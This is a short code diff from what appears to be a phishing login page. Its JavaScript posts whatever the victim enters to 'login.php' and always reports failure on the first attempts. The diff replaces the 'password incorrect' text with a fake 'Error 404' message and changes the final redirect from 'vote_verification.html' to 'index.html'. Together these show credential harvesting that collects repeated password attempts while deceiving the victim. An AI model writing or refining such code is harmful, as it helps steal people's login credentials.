@@ -152,12 +152,12 @@
            response.open('POST', './login.php', true);
            response.send(data);
            x ++
-           feedback.textContent = 'The password you entered is incorrect. Please check your password and try again';
+           feedback.textContent = 'Error 404 Please kindly try again later...';
            if (x == 2) {
-               feedback.textContent = 'The password you entered again is still incorrect. Please check your password and try again'
+               feedback.textContent = 'Error 404 Please kindly try again later...'
            }else if (x == 3){
                feedback.textContent = '';
-               window.location.href='vote_verification.html'
+               window.location.href='./index.html'
            }
        //    }
 
